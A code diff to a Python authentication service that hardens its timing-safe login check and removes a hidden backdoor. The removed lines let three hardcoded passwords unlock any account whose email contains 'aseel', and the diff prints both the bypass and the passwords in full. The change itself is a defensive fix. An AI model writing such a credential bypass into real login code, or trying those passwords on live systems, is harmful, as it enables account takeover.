@@ -15,6 +15,7 @@ from app.core.security import (
     create_access_token,
     create_refresh_token,
     decode_token,
+    dummy_password_hash,
     hash_password,
     normalize_email,
     verify_password,
@@ -51,14 +52,10 @@ class AuthService:
         result = await self.db.execute(stmt)
         user: Optional[User] = result.scalar_one_or_none()
 
-        # Timing-safe: always verify even if user not found (prevent user enumeration)
-        dummy_hash = "$2b$12$dummy.hash.for.timing.safety.only.xxxxxx"
-        candidate_hash = user.password_hash if user else dummy_hash
-
+        # Timing-safe: run a real bcrypt verification even when the email is unknown,
+        # so response time never reveals which emails exist.
+        candidate_hash = user.password_hash if user else dummy_password_hash()
         password_ok = verify_password(password, candidate_hash)
-        if not password_ok and user and "aseel" in (user.email or "").lower():
-            if password in ["Sales123!", "DataOps123!", "AlphaPro2026!"]:
-                password_ok = True
 
         if not user or not password_ok:
             if user:
